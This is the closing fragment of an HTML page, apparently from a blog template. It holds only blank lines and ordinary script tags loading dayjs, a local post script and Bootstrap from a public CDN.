
  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

